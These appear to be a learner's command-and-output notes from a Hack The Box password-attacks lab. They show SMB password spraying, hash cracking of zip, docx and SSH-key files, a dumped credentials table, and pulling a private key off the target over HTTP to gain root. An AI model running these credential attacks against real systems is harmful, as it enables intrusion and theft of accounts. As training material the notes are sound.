## LAB

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip

crackmapexec smb $TARGET -u Administrator -p password.list --shares

SMB         10.129.202.221  445    SKILLS-MEDIUM    [*] Windows 6.1 Build 0 (name:SKILLS-MEDIUM) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.202.221  445    SKILLS-MEDIUM    [+] \Administrator:123456 
SMB         10.129.202.221  445    SKILLS-MEDIUM    [+] Enumerated shares
SMB         10.129.202.221  445    SKILLS-MEDIUM    Share           Permissions     Remark
SMB         10.129.202.221  445    SKILLS-MEDIUM    -----           -----------     ------
SMB         10.129.202.221  445    SKILLS-MEDIUM    print$                          Printer Drivers
SMB         10.129.202.221  445    SKILLS-MEDIUM    SHAREDRIVE      READ            SHARE-DRIVE
SMB         10.129.202.221  445    SKILLS-MEDIUM    IPC$                            IPC Service (skills-medium server (Samba, Ubuntu))

smbclient //dc01/c$ -k -c 'recurse;ls' -u Administrator -p 123456

rpcclient -U Administrator $TARGET

crackmapexec smb $TARGET --shares -u 'Administrator' -p '123456'

smbclient -U Administrator \\\\$TARGET\\SHAREDRIVE

get Docs.zip 

locate *2john*

/usr/bin/zip2john Docs.zip > zip.hash
cat zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

john zip.hash --show
0 password hashes cracked, 1 left

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
john --wordlist=mut_password.list zip.hash
john zip.hash --show

Docs.zip/Documentation.docx:Destiny2022!:Documentation.docx:Docs.zip::Docs.zip
1 password hash cracked, 0 left

unzip Docs.zip
Destiny2022!

/usr/share/john/office2john.py Documentation.docx > zipdocx.hash
john --wordlist=mut_password.list zipdocx.hash
john zipdocx.hash --show

Documentation.docx:987654321
1 password hash cracked, 0 left

sudo apt-get update && sudo apt-get install libreoffice

libreoffice &
987654321

ssh jason@$TARGET
C4mNKjAtL2dydsYa6

mysql -u jason -pC4mNKjAtL2dydsYa6
show databases;
use users;
show tables;
show columns from creds;
select id, name, password from creds;

+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
|   3 | Uriel Velez        | OAY05YXS1XN    |
|   4 | Vanna Benton       | EAU86WAY1BY    |
|   5 | Philip Morales     | ONC53GFI2ID    |
|   6 | Joshua Morgan      | AHJ46CDW4LH    |
|   7 | Hadley Hanson      | YVD16TIY3QI    |
|   8 | Branden Moses      | ZBE71RLJ5HN    |
|   9 | Pandora Sears      | WYP33WEF5GY    |
|  10 | Orla Lambert       | MLZ15XKR8SF    |
|  11 | Maite Moran        | FOS06OOU2DF    |
|  12 | Cassandra Mccarthy | SIB53CEH5DE    |
|  13 | Leroy Sullivan     | HIC68RBH5EI    |
|  14 | Wyoming Quinn      | LJM77SJC6BN    |
|  15 | Asher Wise         | HHP00OHN8OD    |
|  16 | Shelby Garrison    | SOI55QEP2QC    |
|  17 | Garth Landry       | YOX30FPX2UK    |
|  18 | Cailin Lang        | VYE12SKJ3BG    |
|  19 | Tyrone Gross       | GCM52PLH8LH    |
|  20 | Moana Bernard      | EMK37PGI1BC    |
|  21 | Nell Forbes        | YXY78WCW4GX    |
|  22 | Acton Mccormick    | RSI82CFW9QR    |
|  23 | Odessa Knapp       | CXR22UOP5PV    |
|  24 | Gary Phelps        | KDN93TNB6IB    |
|  25 | Jonah Byrd         | GWK11PET1YK    |
|  26 | Lewis Clements     | ACJ89KMH8IX    |
|  27 | Hasad Dejesus      | GSH56VRQ3FD    |
|  28 | Naomi Guerra       | YJY12IMO3YJ    |
|  29 | Renee Levine       | UAT22NOU6JJ    |
|  30 | Dieter Terry       | KPE74PKB7BE    |
|  31 | Lucas Cooper       | JQY67QCL3SG    |
|  32 | Reece Cherry       | TGV05UOE4MW    |
|  33 | Len Olsen          | SQT66ETU2ML    |
|  34 | Amir Booth         | SNA73SNK1CZ    |
|  35 | Logan Burnett      | BDY84TGX7WC    |
|  36 | Quinn Mcintyre     | UEL46HQC8PI    |
|  37 | Harding Garrison   | MUT33ERW8PN    |
|  38 | Addison Ellison    | RYR75LXH4WI    |
|  39 | Anne Rose          | IOI62GUK7KK    |
|  40 | Alika Richmond     | GUK64BKH7NJ    |
|  41 | Kennan Hopkins     | AKE20VJV3TK    |
|  42 | Katell Pace        | KDK46LGC3TS    |
|  43 | Shoshana Murray    | TDX83THW8CG    |
|  44 | Erasmus Brewer     | MBN41SYM4SC    |
|  45 | Lewis Bryan        | DDI16XVP2LF    |
|  46 | Yoko Bryan         | ISE37BPH4HE    |
|  47 | Karleigh York      | JYU77OSI6XM    |
|  48 | Brennan Nelson     | LUM81UWX3EX    |
|  49 | Quintessa Hughes   | OCE13YLK4YU    |
|  50 | Clinton Pugh       | LYM63FLG3WJ    |
|  51 | Aaron Duncan       | EXI67QKU1DV    |
|  52 | Rebekah Boyle      | TSU58EWW7AV    |
|  53 | Inga Pickett       | LBI88TBG8FG    |
|  54 | Nelle Harmon       | SCS45PQE2SF    |
|  55 | Lee Hendrix        | WCF07LWQ7DI    |
|  56 | Zane Reid          | WHM08PCI6YJ    |
|  57 | Neil Santos        | VFP69WHB8QJ    |
|  58 | Hilda Cameron      | ECP57KJV6GF    |
|  59 | Kasper Franklin    | CUB01RJE1TV    |
|  60 | Lamar Ellison      | ECD63FEI7EC    |
|  61 | Oliver Collier     | UAK54DNB5NU    |
|  62 | Jeanette Stewart   | HCY40SWK4TS    |
|  63 | Dean Hale          | FYX44JDS3FW    |
|  64 | Jasper Walter      | UHE24MXN7UY    |
|  65 | Tasha Nguyen       | LIC48RCT5XL    |
|  66 | Hamilton Lynch     | DBL85UPK4WA    |
|  67 | Mariko Harris      | VSH42HZG2NI    |
|  68 | Caleb Wooten       | RQK77XPZ3UM    |
|  69 | Adele Glenn        | CEH74EIK1HP    |
|  70 | Alvin Lambert      | IYI54DJF1VW    |
|  71 | Barbara Roman      | TYV58TDS0VW    |
|  72 | Naida Arnold       | SLS89ENT3CE    |
|  73 | Rebekah Alexander  | YRR18NTB0SI    |
|  74 | Chava Durham       | CRO01QSG2QS    |
|  75 | Ainsley Pittman    | HYY51CZI5IP    |
|  76 | Danielle Howell    | MGQ65TBI1IH    |
|  77 | Cairo Dale         | QKY37WGY6PK    |
|  78 | Kathleen Fulton    | QWA22ZTE7FK    |
|  79 | Kelsie Mcpherson   | BQP07JMR6HP    |
|  80 | Bevis Herman       | SOR60URB2NJ    |
|  81 | Mufutau Baldwin    | QBB25FTD7HV    |
|  82 | Genevieve Ryan     | KON69QNC5UQ    |
|  83 | Lucius Wall        | JVX56EQT7YI    |
|  84 | Cassidy Gutierrez  | KLZ78QIH6KH    |
|  85 | Aladdin Fisher     | KYS21TWU3GS    |
|  86 | Paul Lancaster     | WDW24NGN8KA    |
|  87 | Jael Roberts       | MML82LOC4FN    |
|  88 | Zena Solomon       | DJN31MHH6UV    |
|  89 | Josephine Garza    | UWZ57ZKM1IV    |
|  90 | Jason Norman       | ISO35HVC2BW    |
|  91 | Rajah Ellison      | TIY46YPJ5TA    |
|  92 | Colt Ferrell       | YCX56EKU9QO    |
|  93 | Brenna Kinney      | FGD21LBQ6IS    |
|  94 | Valentine Mcdowell | XIP27KBN6KL    |
|  95 | Alexander Keith    | CJT35RAJ7DC    |
|  96 | Charles Bell       | FAG53RFK7TH    |
|  97 | Justina Greer      | YPG28SUE4JD    |
|  98 | Elton Wallace      | SGH05RBW1YL    |
|  99 | Jamalia Byers      | KVE47IWE5UF    |
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |

ssh dennis@$TARGET
7AUgWWQEiMPdqx

cat .bash_history

ssh-keygen -m PEM -t rsa
ls
cd
cd ..
cd
cd .ssh/
ls
cat id_rsa.pub > authorized_keys
vim authorized_keys 
passwd
clear
exit
cd .ssh
cat id_rsa


cat .ssh/id_rsa

On target :
cd .ssh/
python3 -m http.server

On pwnbox :
wget $TARGET:8000/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,735C4BC00394A787F6FCE95C5B7F2331

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
-----END RSA PRIVATE KEY-----

locate *2john*

/usr/share/john/ssh2john.py

/usr/share/john/ssh2john.py id_rsa > ssh.hash

Traceback (most recent call last):
  File "/usr/share/john/ssh2john.py", line 193, in <module>
    read_private_key(filename)
  File "/usr/share/john/ssh2john.py", line 103, in read_private_key
    data = base64.decodestring(data)
AttributeError: module 'base64' has no attribute 'decodestring'


103         data = base64.decodebytes(data)


cat ssh.hash
john --wordlist=mut_password.list ssh.hash
john ssh.hash --show

id_rsa:P@ssw0rd12020!
1 password hash cracked, 0 left

chmod 600 id_rsa
ssh -i id_rsa root@$TARGET